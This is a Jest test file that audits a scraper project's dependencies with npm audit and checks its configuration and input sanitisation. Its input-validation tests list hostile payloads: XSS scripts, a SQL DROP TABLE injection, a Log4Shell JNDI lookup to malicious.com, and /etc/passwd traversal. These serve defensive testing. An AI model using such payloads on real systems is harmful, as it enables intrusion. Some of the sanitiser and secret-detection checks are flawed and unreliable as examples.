/**
 * Security Vulnerability Scanning Tests
 * Automated security testing for the business scraper application
 */

import { jest } from '@jest/globals'
import { spawn } from 'child_process'
import fs from 'fs/promises'
import path from 'path'
import { logger } from '@/utils/logger'

// Mock logger for testing
jest.mock('@/utils/logger')

interface VulnerabilityReport {
  severity: 'low' | 'moderate' | 'high' | 'critical'
  title: string
  description: string
  package: string
  version: string
  cve?: string
  recommendation: string
}

interface SecurityScanResult {
  vulnerabilities: VulnerabilityReport[]
  totalVulnerabilities: number
  criticalCount: number
  highCount: number
  moderateCount: number
  lowCount: number
  scanDate: string
}

class SecurityScanner {
  private reportPath = path.join(process.cwd(), 'security-report.json')

  async runNpmAudit(): Promise<SecurityScanResult> {
    return new Promise((resolve, reject) => {
      const auditProcess = spawn('npm', ['audit', '--json'], {
        stdio: ['pipe', 'pipe', 'pipe'],
      })

      let stdout = ''
      let stderr = ''

      auditProcess.stdout.on('data', data => {
        stdout += data.toString()
      })

      auditProcess.stderr.on('data', data => {
        stderr += data.toString()
      })

      auditProcess.on('close', code => {
        try {
          // npm audit returns non-zero exit code when vulnerabilities are found
          // This is expected behavior, so we don't reject on non-zero exit codes
          const result = this.parseNpmAuditOutput(stdout)
          resolve(result)
        } catch (error) {
          logger.error('SecurityScanner', 'Failed to parse npm audit output', error)
          reject(new Error(`npm audit failed: ${stderr || error}`))
        }
      })

      auditProcess.on('error', error => {
        reject(new Error(`Failed to run npm audit: ${error.message}`))
      })
    })
  }

  private parseNpmAuditOutput(output: string): SecurityScanResult {
    try {
      const auditData = JSON.parse(output)
      const vulnerabilities: VulnerabilityReport[] = []

      // Parse vulnerabilities from npm audit output
      if (auditData.vulnerabilities) {
        Object.entries(auditData.vulnerabilities).forEach(
          ([packageName, vulnData]: [string, any]) => {
            if (vulnData.via && Array.isArray(vulnData.via)) {
              vulnData.via.forEach((via: any) => {
                if (typeof via === 'object' && via.title) {
                  vulnerabilities.push({
                    severity: via.severity || 'moderate',
                    title: via.title,
                    description: via.url || 'No description available',
                    package: packageName,
                    version: vulnData.version || 'unknown',
                    cve: via.cve,
                    recommendation: vulnData.fixAvailable ? 'Update available' : 'No fix available',
                  })
                }
              })
            }
          }
        )
      }

      // Count vulnerabilities by severity
      const criticalCount = vulnerabilities.filter(v => v.severity === 'critical').length
      const highCount = vulnerabilities.filter(v => v.severity === 'high').length
      const moderateCount = vulnerabilities.filter(v => v.severity === 'moderate').length
      const lowCount = vulnerabilities.filter(v => v.severity === 'low').length

      return {
        vulnerabilities,
        totalVulnerabilities: vulnerabilities.length,
        criticalCount,
        highCount,
        moderateCount,
        lowCount,
        scanDate: new Date().toISOString(),
      }
    } catch (error) {
      logger.error('SecurityScanner', 'Failed to parse npm audit JSON output', error)

      // Return empty result if parsing fails
      return {
        vulnerabilities: [],
        totalVulnerabilities: 0,
        criticalCount: 0,
        highCount: 0,
        moderateCount: 0,
        lowCount: 0,
        scanDate: new Date().toISOString(),
      }
    }
  }

  async saveReport(result: SecurityScanResult): Promise<void> {
    await fs.writeFile(this.reportPath, JSON.stringify(result, null, 2))
    logger.info('SecurityScanner', `Security report saved to ${this.reportPath}`)
  }

  async loadPreviousReport(): Promise<SecurityScanResult | null> {
    try {
      const data = await fs.readFile(this.reportPath, 'utf-8')
      return JSON.parse(data)
    } catch (error) {
      logger.warn('SecurityScanner', 'No previous security report found')
      return null
    }
  }

  compareReports(
    current: SecurityScanResult,
    previous: SecurityScanResult
  ): {
    newVulnerabilities: VulnerabilityReport[]
    resolvedVulnerabilities: VulnerabilityReport[]
    regressionDetected: boolean
  } {
    const currentVulnIds = new Set(current.vulnerabilities.map(v => `${v.package}-${v.title}`))
    const previousVulnIds = new Set(previous.vulnerabilities.map(v => `${v.package}-${v.title}`))

    const newVulnerabilities = current.vulnerabilities.filter(
      v => !previousVulnIds.has(`${v.package}-${v.title}`)
    )

    const resolvedVulnerabilities = previous.vulnerabilities.filter(
      v => !currentVulnIds.has(`${v.package}-${v.title}`)
    )

    const regressionDetected =
      current.criticalCount > previous.criticalCount ||
      current.highCount > previous.highCount ||
      newVulnerabilities.some(v => v.severity === 'critical' || v.severity === 'high')

    return {
      newVulnerabilities,
      resolvedVulnerabilities,
      regressionDetected,
    }
  }
}

describe('Security Vulnerability Scanning', () => {
  let securityScanner: SecurityScanner

  beforeAll(() => {
    securityScanner = new SecurityScanner()
  })

  beforeEach(() => {
    jest.clearAllMocks()
  })

  describe('Dependency Vulnerability Scanning', () => {
    test('should run npm audit and detect vulnerabilities', async () => {
      const result = await securityScanner.runNpmAudit()

      expect(result).toBeDefined()
      expect(result.scanDate).toBeDefined()
      expect(typeof result.totalVulnerabilities).toBe('number')
      expect(typeof result.criticalCount).toBe('number')
      expect(typeof result.highCount).toBe('number')
      expect(typeof result.moderateCount).toBe('number')
      expect(typeof result.lowCount).toBe('number')
      expect(Array.isArray(result.vulnerabilities)).toBe(true)

      // Log scan results
      logger.info(
        'SecurityTest',
        `Security scan completed: ${result.totalVulnerabilities} vulnerabilities found`
      )
      logger.info(
        'SecurityTest',
        `Critical: ${result.criticalCount}, High: ${result.highCount}, Moderate: ${result.moderateCount}, Low: ${result.lowCount}`
      )

      // Save report for future comparisons
      await securityScanner.saveReport(result)
    }, 60000)

    test('should have acceptable vulnerability levels', async () => {
      const result = await securityScanner.runNpmAudit()

      // Security thresholds - adjust based on project requirements
      expect(result.criticalCount).toBeLessThanOrEqual(0) // No critical vulnerabilities allowed
      expect(result.highCount).toBeLessThanOrEqual(2) // Maximum 2 high severity vulnerabilities
      expect(result.moderateCount).toBeLessThanOrEqual(10) // Maximum 10 moderate vulnerabilities

      if (result.criticalCount > 0) {
        const criticalVulns = result.vulnerabilities.filter(v => v.severity === 'critical')
        logger.error('SecurityTest', 'Critical vulnerabilities detected:', criticalVulns)
      }

      if (result.highCount > 2) {
        const highVulns = result.vulnerabilities.filter(v => v.severity === 'high')
        logger.warn('SecurityTest', 'High severity vulnerabilities detected:', highVulns)
      }
    }, 60000)

    test('should detect security regressions', async () => {
      const currentResult = await securityScanner.runNpmAudit()
      const previousResult = await securityScanner.loadPreviousReport()

      if (previousResult) {
        const comparison = securityScanner.compareReports(currentResult, previousResult)

        if (comparison.regressionDetected) {
          logger.warn('SecurityTest', 'Security regression detected!')
          logger.warn(
            'SecurityTest',
            `New vulnerabilities: ${comparison.newVulnerabilities.length}`
          )

          comparison.newVulnerabilities.forEach(vuln => {
            logger.warn(
              'SecurityTest',
              `New vulnerability: ${vuln.package} - ${vuln.title} (${vuln.severity})`
            )
          })
        }

        if (comparison.resolvedVulnerabilities.length > 0) {
          logger.info(
            'SecurityTest',
            `Resolved vulnerabilities: ${comparison.resolvedVulnerabilities.length}`
          )
        }

        // Fail test if critical or high severity vulnerabilities were introduced
        const newCriticalOrHigh = comparison.newVulnerabilities.filter(
          v => v.severity === 'critical' || v.severity === 'high'
        )

        expect(newCriticalOrHigh.length).toBe(0)
      } else {
        logger.info('SecurityTest', 'No previous security report found, creating baseline')
      }

      await securityScanner.saveReport(currentResult)
    }, 60000)
  })

  describe('Security Configuration Tests', () => {
    test('should have secure package.json configuration', async () => {
      const packageJsonPath = path.join(process.cwd(), 'package.json')
      const packageJson = JSON.parse(await fs.readFile(packageJsonPath, 'utf-8'))

      // Check for security-related scripts
      expect(packageJson.scripts).toHaveProperty('security-check')
      expect(packageJson.scripts).toHaveProperty('security-audit')

      // Check for security-related dev dependencies
      expect(packageJson.devDependencies).toHaveProperty('audit-ci')
      expect(packageJson.devDependencies).toHaveProperty('eslint-plugin-security')
    })

    test('should have secure environment configuration', async () => {
      // Check that sensitive environment variables are not hardcoded
      const envFiles = [
        '.env.example',
        'config/development.env.example',
        'config/production.env.example',
        'config/test.env.example',
      ]

      for (const envFile of envFiles) {
        try {
          const envPath = path.join(process.cwd(), envFile)
          const envContent = await fs.readFile(envPath, 'utf-8')

          // Check that no actual secrets are present in example files
          expect(envContent).not.toMatch(/password=.+[^example]/i)
          expect(envContent).not.toMatch(/secret=.+[^example]/i)
          expect(envContent).not.toMatch(/key=.+[^example]/i)
          expect(envContent).not.toMatch(/token=.+[^example]/i)
        } catch (error) {
          // File doesn't exist, which is acceptable
          logger.info('SecurityTest', `Environment file ${envFile} not found`)
        }
      }
    })

    test('should not expose sensitive information in logs', () => {
      // Mock logger to capture log calls
      const logSpy = jest.spyOn(logger, 'info')
      const errorSpy = jest.spyOn(logger, 'error')

      // Simulate logging with potentially sensitive data
      logger.info('Test', 'Processing user data', {
        userId: '12345',
        email: 'test@example.com',
        // Should not log passwords or tokens
      })

      // Verify that sensitive patterns are not logged
      const allLogCalls = [...logSpy.mock.calls, ...errorSpy.mock.calls]

      allLogCalls.forEach(call => {
        const logMessage = JSON.stringify(call)
        expect(logMessage).not.toMatch(/password/i)
        expect(logMessage).not.toMatch(/secret/i)
        expect(logMessage).not.toMatch(/token/i)
        expect(logMessage).not.toMatch(/api[_-]?key/i)
      })

      logSpy.mockRestore()
      errorSpy.mockRestore()
    })
  })

  describe('Input Validation Security', () => {
    test('should validate and sanitize URL inputs', () => {
      const maliciousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd',
        'ftp://malicious.com/payload',
        'http://localhost:22/ssh-attack',
      ]

      maliciousUrls.forEach(url => {
        // Test URL validation logic
        expect(() => {
          const urlObj = new URL(url)
          if (!['http:', 'https:'].includes(urlObj.protocol)) {
            throw new Error('Invalid protocol')
          }
        }).toThrow()
      })
    })

    test('should prevent injection attacks in search queries', () => {
      const maliciousQueries = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE businesses; --',
        '${jndi:ldap://malicious.com/payload}',
        '../../../etc/passwd',
        '{{constructor.constructor("alert(1)")()}}',
      ]

      maliciousQueries.forEach(query => {
        // Test query sanitization
        const sanitized = query
          .replace(/<[^>]*>/g, '') // Remove HTML tags
          .replace(/['"`;]/g, '') // Remove SQL injection characters
          .replace(/\$\{.*\}/g, '') // Remove template injection
          .replace(/\.\./g, '') // Remove path traversal
          .replace(/\{\{.*\}\}/g, '') // Remove template expressions

        expect(sanitized).not.toContain('<script>')
        expect(sanitized).not.toContain('DROP TABLE')
        expect(sanitized).not.toContain('${')
        expect(sanitized).not.toContain('..')
        expect(sanitized).not.toContain('{{')
      })
    })
  })
})
